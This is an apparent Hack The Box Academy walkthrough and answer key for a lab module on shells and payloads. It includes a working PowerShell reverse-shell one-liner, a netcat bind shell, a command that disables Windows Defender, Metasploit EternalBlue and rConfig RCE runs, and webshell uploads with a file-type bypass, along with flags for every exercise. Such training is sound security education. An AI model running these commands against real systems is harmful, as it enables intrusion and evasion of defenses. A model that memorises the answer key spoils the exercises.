![[cheatsheat-Shells & Payloads]]

# Shells & Payloads Module



## Section Questions and their Answers

|Section|Question Number|Answer|
|---|---|---|
|Anatomy of a Shell|Question 1|bash&powershell|
|Anatomy of a Shell|Question 2|Core|
|Bind Shells|Question 1|443|
|Bind Shells|Question 2|B1nD_Shells_r_cool|
|Reverse Shells|Question 1|client|
|Reverse Shells|Question 2|SHELLS-WIN10|
|Automating Payloads & Delivery with Metasploit|Question 1|powershell|
|Automating Payloads & Delivery with Metasploit|Question 2|staffsalaries.txt|
|Infiltrating Windows|Question 1|.bat|
|Infiltrating Windows|Question 2|MS17-010|
|Infiltrating Windows|Question 3|EB-Still-W0rk$|
|Infiltrating Unix/Linux|Question 1|php|
|Infiltrating Unix/Linux|Question 2|edgerouter-isp|
|Laudanum, One Webshell to Rule Them All|Question 1|c:\windows\system32\inetsrv|
|Laudanum, One Webshell to Rule Them All|Question 2|/usr/share/laudanum/aspx/shell.aspx|
|Antak Webshell|Question 1|/usr/share/nishang/Antak-WebShell/antak.aspx|
|Antak Webshell|Question 2|iis apppool\status|
|PHP Web Shells|Question 1|image/gif|
|PHP Web Shells|Question 2|ajax-loader.gif|
|The Live Engagement|Question 1|shells-winsvr|
|The Live Engagement|Question 2|dev-share|
|The Live Engagement|Question 3|ubuntu|
|The Live Engagement|Question 4|php|
|The Live Engagement|Question 5|B1nD_Shells_r_cool|
|The Live Engagement|Question 6|shells-winblue|
|The Live Engagement|Question 7|One-H0st-Down!|

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Anatomy of a Shell

## Question 1

### "Which two shell languages did we experiment with in this section? (Format: shellname&shellname)"

`Bash` and `PowerShell` are the two shell languages that were taught to students.

Answer: `Bash&PowerShell`

# Anatomy of a Shell

## Question 2

### "In Pwnbox issue the $PSversiontable variable using PowerShell. Submit the edition of PowerShell that is running as the answer."

Students first need to launch PowerShell:

Code: shell

```shell
pwsh
```

```shell-session
┌─[eu-academy-2]─[10.10.15.49]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ pwsh

PowerShell 7.1.3
```

Then, students need to query for the automatic variable `$PSversiontable`:

Code: powershell

```powershell
$PSversiontable
```

```powershell-session
┌─[eu-academy-2]─[10.10.15.49]─[htb-ac413848@pwnbox-base]─[/home/htb-ac413848]
└──╼ [PS]> $PSversiontable

Name                           Value
----                           -----
PSVersion                      7.1.3
PSEdition                      Core
<SNIP>
```

The edition from the output of the command is `Core`.

Alternatively, students can directly reference the `PSEdition` property on the `$PSversiontable` automatic variable:

Code: powershell

```powershell
$PSversiontable.PSEdition
```

```powershell-session
┌[htb-aiebqqjknx@htb-ac413848]-[/root]
└╼$ $PSVersionTable.PSEdition

Core
```

Answer: `Core`

# Bind Shells

## Question 1

### "Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?"

Students need to notice that "Des" is using the `-l` (listen) flag in her `nc` command with port `443` being specified, thus, she will need to connect to the Linux target on port `443` also.

Answer: `443`

# Bind Shells

## Question 2

### "SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts."

Students first need to spawn the target machine then SSH into it using Pwnbox/`PMVPN` with the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[eu-academy-2]─[10.10.15.49]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.201.134

The authenticity of host '10.129.201.134 (10.129.201.134)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
htb-student@10.129.201.134's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-88-generic x86_64)

htb-student@ubuntu:~$
```

Then, students need to start a bind shell listener on the spawned target machine:

Code: shell

```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l STMIP STMPO > /tmp/f
```

```shell-session
htb-student@ubuntu:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.201.134 7777 > /tmp/f
```

Subsequently, students need to connect to the spawned target machine from Pwnbox/`PMVPN` by connecting to the bind shell listening on it:

Code: shell

```shell
nc -nv STMIP STMPO
```

```shell-session
┌─[eu-academy-2]─[10.10.15.49]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nc -nv 10.129.201.134 7777
(UNKNOWN) [10.129.201.134] 7777 (?) open

htb-student@ubuntu:~$ 
```

![Shells_&_Payloads_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_1.png)

Now that students have attained a bind shell on the spawned target machine, they can read the flag file "flag.txt" under the "/customscripts/" directory:

Code: shell

```shell
cat /customscripts/flag.txt
```

```shell-session
htb-student@ubuntu:~$ cat /customscripts/flag.txt

B1nD_Shells_r_cool
```

Answer: `B1nD_Shells_r_cool`

# Reverse Shells

## Question 1

### "When establishing a reverse shell session with a target, will the target act as a client or server?"

Students will know after reading the section's content that the target will act as a `client`:

![Shells_&_Payloads_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_2.png)

Answer: `Client`

# Reverse Shells

## Question 2

### "Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box."

Students first need to spawn the target machine, then use `xfreerdp` to connect to it via RDP using Pwnbox/`PMVPN` with the credentials `htb-student:HTB_@cademy_stdnt!`::

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[eu-academy-2]─[10.10.15.49]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.201.51 /u:htb-student /p:HTB_@cademy_stdnt!

[00:46:45:893] [75846:75847] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[00:46:45:893] [75846:75847] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
<SNIP>
```

Students then will have access to the Windows target machine:

![Shells_&_Payloads_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_3.png)

To establish a reverse shell session, students need to start a privileged `netcat` listener on port 443 using Pwnbox/`PMVPN`:

Code: shell

```shell
sudo nc -lvnp 443
```

```shell-session
┌─[eu-academy-2]─[10.10.15.49]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo nc -lvnp 443

listening on [any] 443 ...
```

Then, on the Windows target machine, students need to use a PowerShell reverse shell command to connect back to the listener on port 443 in Pwnbox/`PMVPN`:

Code: powershell

```powershell
PowerShell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('PWNIP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell-session
C:\Users\htb-student\Desktop>PowerShell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.49',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

After executing the reverse shell call-back command on the Windows target machine, students will receive the reverse shell on their Pwnbox/`PMVPN`:

![Shells_&_Payloads_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_4.png)

However, in case students get an error message of Windows Defender stopping their execution of the command:

```powershell-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.15.49',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

Students need to open PowerShell as "Administrator" and disable Windows Defender from using real-time protection:

Code: powershell

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

```powershell-session
PS C:\Windows\system32> Set-MpPreference -DisableRealtimeMonitoring $true
```

![Shells_&_Payloads_Walkthrough_Image_5.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_5.png)

Subsequently, students need to rerun the reverse shell call-back command on the Windows target machine to receive their reverse shell session.

At last, students need to issue the `hostname` command and find the answer:

Code: powershell

```powershell
hostname
```

```powershell-session
PS C:\Users\htb-student> hostname

Shells-Win10
```

Answer: `Shells-Win10`

# Automating Payloads & Delivery with Metasploit

## Question 1

### "What command language interpreter is used to establish a system shell session with the target?"

Students will notice that it is `PowerShell` from reading the "Exploits Away" subsection:

![Shells_&_Payloads_Walkthrough_Image_6.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_6.png)

Answer: `PowerShell`

# Automating Payloads & Delivery with Metasploit

## Question 2

### "Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)"

Students will start with enumeration by first launching an Nmap scan against the spawned target machine to discover its open ports:

Code: shell

```shell
nmap -A -Pn STMIP
```

```shell-session
┌─[eu-academy-2]─[10.10.15.49]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.201.160

Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 07:10 GMT
Nmap scan report for 10.129.201.160
Host is up (0.056s latency).
Not shown: 990 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
7/tcp    open  echo
9/tcp    open  discard?
13/tcp   open  daytime      Microsoft Windows USA daytime
17/tcp   open  qotd         Windows qotd (English)
19/tcp   open  chargen
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
2179/tcp open  vmrdp?
Service Info: Host: SHELLS-WIN10; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1:
|	Message signing enabled but not required
|_
| smb2-time: 
|   date: 2022-03-21T03:49:36
|_  start_date: N/A
```

Since the target is running the Windows 7 OS and has the SMB port open, it will most probably be vulnerable to SMB attacks/exploits. Thus, students need to use Metasploit and choose `exploit/windows/smb/psexec` as the exploit:

Code: shell

```shell
msfconsole -q
set RHOSTS STMIP
set SHARE ADMIN$
set SMBPass HTB_@cademy_stdnt!
set SMBUser htb-student
set LHOST PWNIP
exploit
```

```shell-session
┌─[eu-academy-2]─[10.10.15.49]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfconsole -q

msf6 > use exploit/windows/smb/psexec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.201.160
RHOSTS => 10.129.201.160

msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$ 
SHARE => ADMIN$

msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!

msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student

msf6 exploit(windows/smb/psexec) > set LHOST 10.10.15.49
LHOST => 10.10.15.49

msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.15.49:4444 
[*] 10.129.201.160:445 - Connecting to the server...
[*] 10.129.201.160:445 - Authenticating to 10.129.201.160:445 as user 'htb-student'...
[*] 10.129.201.160:445 - Selecting PowerShell target
<SNIP>
[*] Meterpreter session 1 opened (10.10.15.49:4444 -> 10.129.201.160:49874) at 2022-03-18 07:45:08 +0000

meterpreter >
```

After attaining a Meterpreter session, students at last need to list the files under the "Documents" directory to find a file named `staffsalaries.txt`:

Code: shell

```shell
ls C:/Users/htb-student/Documents/
```

```shell-session
meterpreter > ls C:/Users/htb-student/Documents/

Listing: C:/Users/htb-student/Documents/
========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2021-10-16 17:08:05 +0100  My Music
40777/rwxrwxrwx   0     dir   2021-10-16 17:08:05 +0100  My Pictures
40777/rwxrwxrwx   0     dir   2021-10-16 17:08:05 +0100  My Videos
100666/rw-rw-rw-  402   fil   2021-10-16 17:08:07 +0100  desktop.ini
100666/rw-rw-rw-  268   fil   2021-10-16 21:12:13 +0100  staffsalaries.txt
```

Answer: `staffsalaries.txt`

# Infiltrating Windows

## Question 1

### "What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')"

From reading the "Payload Types to Consider" subsection, students will know that the file extension is `.bat`:

![Shells_&_Payloads_Walkthrough_Image_7.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_7.png)

Answer: `.bat`

# Infiltrating Windows

## Question 2

### "What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)"

From the "Prominent Windows Exploits" subsection, students will know that the exploit was dubbed as `EternalBlue` or, `MS17-010`:

![Shells_&_Payloads_Walkthrough_Image_8.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_8.png)

Answer: `MS17-010`

# Infiltrating Windows

## Question 3

### "Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:"

Students will first start their enumeration by launching an Nmap scan against the spawned target machine to discover its open ports:

Code: shell

```shell
nmap -A -Pn STMIP
```

```shell-session
┌─[eu-academy-2]─[10.10.15.49]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.201.97

Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 12:00 GMT
Nmap scan report for 10.129.201.97
Host is up (0.039s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 10.129.201.97 - /
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-03-18T05:00:54-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-03-18T12:00:53
|_  start_date: 2022-03-18T11:59:55
|_clock-skew: mean: 2h20m01s, deviation: 4h02m31s, median: 0s
```

Since the SMB port 445 is open and the spawned target machine is running the Windows Server 2008 OS, it will most probably be vulnerable to `EternalBlue`, thus, students need to use Metasploit and choose `exploit/windows/smb/ms17_010_psexec` as the exploit/module:

Code: shell

```shell
msfconsole -q
use exploit/windows/smb/ms17_010_psexec
set RHOSTS STMIP
set LHOST PWNIP
exploit
```

```shell-session
┌─[eu-academy-2]─[10.10.15.49]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfconsole -q

msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.153.252
RHOSTS => 10.129.153.252

msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.15.49
LHOST => 10.10.15.49

msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.15.49:4444
<SNIP>
[*] Meterpreter session 1 opened (10.10.15.49:4444 -> 10.129.153.252:49671) at 2022-03-18 12:30:01 +0000

meterpreter >
```

After attaining a Meterpreter session, students at last need to print the contents of the flag file "flag.txt":

Code: shell

```shell
cat C:/flag.txt
```

```shell-session
meterpreter > cat C:/flag.txt

EB-Still-W0rk$
```

Answer: `EB-Still-W0rk$`

# Infiltrating Unix/Linux

## Question 1

### "What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?"

From reading the "Execute the Exploit" subsection, students will know that the file extension is `php`:

![Shells_&_Payloads_Walkthrough_Image_9.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_9.png)

Answer: `php`

# Infiltrating Unix/Linux

## Question 2

### "Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system."

Students will need to first start their enumeration by launching an Nmap scan against the spawned target machine to discover its open ports:

Code: shell

```shell
nmap -A -Pn STMIP
```

```shell-session
┌─[eu-academy-2]─[10.10.14.253]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.201.101

Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-20 22:49 GMT
Nmap scan report for 10.129.201.101
Host is up (0.078s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-title: Did not follow redirect to https://10.129.201.101/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
<SNIP>
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL (unauthorized)
```

Students will notice that ports 80 and 443 are open, thus, they need to navigate to the root page of the target's website. When warned with a security risk, students need to click on "Advanced..." then "Accept the Risk and Continue":

![Shells_&_Payloads_Walkthrough_Image_10.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_10.png)

Students then will be redirected to a login page for rConfig, which shows that it has a version number of `3.9.6`:

![Shells_&_Payloads_Walkthrough_Image_11.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_11.png)

This version is vulnerable to RCE, as shown in the "Discovering a Vulnerability in rConfig" subsection. Thus, students will need to use Metasploit to exploit this vulnerability (this exploit module requires a username and a password, however, because the aim of this module is to teach about Shells and Payloads mainly, students can leave out the default settings for the options USERNAME and PASSWORD, i.e., `admin:admin`:

Code: shell

```shell
msfconsole -q
set RHOSTS STMIP
set LHOST PWNIP
set SRVHOST PWNIP
exploit
```

```shell-session
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce 
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set RHOSTS 10.129.201.101 
setRHOSTS => 10.129.201.101

msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set LHOST 10.10.14.253
LHOST => 10.10.14.253

msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set SRVHOST 10.10.14.253
SRVHOST => 10.10.14.253

msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.253:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'busfcj.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted busfcj.php
[*] Meterpreter session 1 opened 
(10.10.14.253:4444 -> 10.129.201.101:37732)
at 2022-03-20 23:14:44 +0000

meterpreter >
```

Once a Metrepreter session has been established, students need to navigate to the "/devicedetails" directory to find out the hostname of the router, after reading the contents of the file "hostnameinfo.txt":

Code: shell

```shell
cd /devicedetails
cat hostnameinfo.txt
```

```shell-session
meterpreter > cd /devicedetails
meterpreter > cat hostnameinfo.txt

Note: 

All yaml (.yml) files should be named after the hostname of the router or switch they will configure. We discussed this in our meeting back in January. Ask Bob about it.
```

Answer: `edgerouter-isp`

# Laudanum, One Webshell to Rule Them All

## Question 1

### "Establish a web shell session with the target using the concepts covered in this section. Submit the full path of the directory you land in. (Format: c:\\path\\you\\land\\in)"

After spawning the target machine, students need to edit the /etc/hosts file by adding `status.inlanefreight.local` with the respective STMIP in Pwnbox/`PMVPN`:

Code: shell

```shell
sudo bash -c 'echo "STMIP status.inlanefreight.local" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.67]─[htb-ac413848@htb-aiebqqjknx]─[~]
└──╼ [★]$ sudo bash -c 'echo "10.129.42.197 status.inlanefreight.local" >> /etc/hosts'
```

Then, students need to make a copy of the laudanum web shell into their home directory of Pwnbox/`PMVPN`:

Code: shell

```shell
cp /usr/share/laudanum/aspx/shell.aspx ./
```

```shell-session
┌─[eu-academy-2]─[10.10.14.253]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cp /usr/share/laudanum/aspx/shell.aspx ./
```

With that copy, students will need to edit line 59 by adding their `PWNIP`:

![Shells_&_Payloads_Walkthrough_Image_12.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_12.png)

After saving the changes, students need to use a browser and visit `http://status.inlanefreight.local` to upload their edited web shell:

![Shells_&_Payloads_Walkthrough_Image_13.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_13.png)

![Shells_&_Payloads_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_14.png)

![Shells_&_Payloads_Walkthrough_Image_15.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_15.png)

Once the web shell has been successfully uploaded, students need to navigate to `http://status.inlanefreight.local/files/shell.aspx` and submit a query with the `dir` command:

![Shells_&_Payloads_Walkthrough_Image_16.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_16.png)

Answer: `c:\windows\system32\inetsrv`

# Laudanum, One Webshell to Rule Them All

## Question 2

### "Where is the Laudanum aspx web shell located on Pwnbox? Submit the full path. (Format: /path/to/laudanumaspx)"

From the "Working with Laudanum" subsection, students will know that the Laudanum web shell is located in the `/usr/share/laudanum/aspx/` directory:

Code: shell

```shell
ls /usr/share/laudanum/aspx/
```

```shell-session
┌─[eu-academy-2]─[10.10.14.253]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ls /usr/share/laudanum/aspx/

shell.aspx
```

Answer: `/usr/share/laudanum/aspx/shell.aspx`

# Antak Webshell

## Question 1

### "Where is the Antak webshell located on Pwnbox? Submit the full path. (Format:/path/to/antakwebshell)"

Students can use the `locate` command on Pwnbox to find the location of the Antak web shell:

Code: shell

```shell
locate antak
```

```shell-session
┌─[eu-academy-2]─[10.10.14.253]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ locate antak

/usr/share/nishang/Antak-WebShell/antak.aspx
```

Answer: `/usr/share/nishang/Antak-WebShell/antak.aspx`

# Antak Webshell

## Question 2

### "Establish a web shell with the target using the concepts covered in this section. Submit the name of the user on the target that the commands are being issued as. In order to get the correct answer you must navigate to the web shell you upload using the vHost name. (Format: \_\_\_\_\\_\_\_\_, 1 space)"

After spawning the target machine, students need to edit the /etc/hosts file by adding `status.inlanefreight.local` with the respective `STMIP` in Pwnbox/`PMVPN`:

Code: shell

```shell
sudo bash -c 'echo "STMIP status.inlanefreight.local" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.67]─[htb-ac413848@htb-aiebqqjknx]─[~]
└──╼ [★]$ sudo bash -c 'echo "10.129.42.197 status.inlanefreight.local" >> /etc/hosts'
```

Then, students need to make a copy of the antak web shell into their home directory of Pwnbox/`PMVPN`:

Code: shell

```shell
cp /usr/share/nishang/Antak-WebShell/antak.aspx ./
```

```shell-session
┌─[eu-academy-2]─[10.10.14.253]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cp /usr/share/nishang/Antak-WebShell/antak.aspx ./
```

With that copy, students can choose to either edit the default credentials of the Antak web shell or leave them as is (i.e. `Disclaimer:ForLegitUseOnly`):

![Shells_&_Payloads_Walkthrough_Image_17.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_17.png)

Students then need to use a browser and visit `http://status.inlanefreight.local` to upload their web shell:

![Shells_&_Payloads_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_18.png)

![Shells_&_Payloads_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_19.png)

Once the web shell has been successfully uploaded, students need to navigate to `http://status.inlanefreight.local/files/antak.aspx` and provide the credentials as configured in the uploaded web shell:

![Shells_&_Payloads_Walkthrough_Image_20.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_20.png)

At last, students need to use the `whoami` command:

![Shells_&_Payloads_Walkthrough_Image_21.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_21.png)

Answer: `iis apppool\status`

# PHP Web Shells

## Question 1

### "In the example shown, what must the Content-Type be changed to in order to successfully upload the web shell? (Format: \_\_\_/\_\_\_)"

From reading the "Bypassing the File Type Restriction" subsection, students will know that the file extension is `image/gif`:

![Shells_&_Payloads_Walkthrough_Image_22.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_22.png)

Answer: `image/gif`

# PHP Web Shells

## Question 2

### "Use what you learned from the module to gain a web shell. What is the file name of the gif in the /images/vendor directory on the target? (Format: \_\_\_\_.gif)"

After spawning the target machine and visiting the root page of its website, students need to recall that this is the same target that was exploited in question 2 of the "Infiltrating Linux" section. Thus, they will sign in using the credentials `admin:admin`:

![Shells_&_Payloads_Walkthrough_Image_23.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_23.png)

Then, they need to click on "Devices" then "Vendors":

![Shells_&_Payloads_Walkthrough_Image_24.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_24.png)

Students then need to click on "Add Vendor":

![Shells_&_Payloads_Walkthrough_Image_25.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_25.png)

Students need to give any name as the "Vendor Name" and upload a php web shell in the "Vendor Logo" instead of an image. [WhiteWinterWolf's](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) web shell can be used, after being cloned from GitHub:

Code: shell

```shell
git clone https://github.com/WhiteWinterWolf/wwwolf-php-webshell.git
```

After cloning the web shell, students will then need to upload it.

However, before attempting to upload the web shell, students need to have an intercepting proxy (such as Burp Suite) be running, and configure their browsers' to direct all connections/sockets to the intercepting proxy (such as with using the `FoxyProxy` extension). Once that is configured, students can upload the web shell:

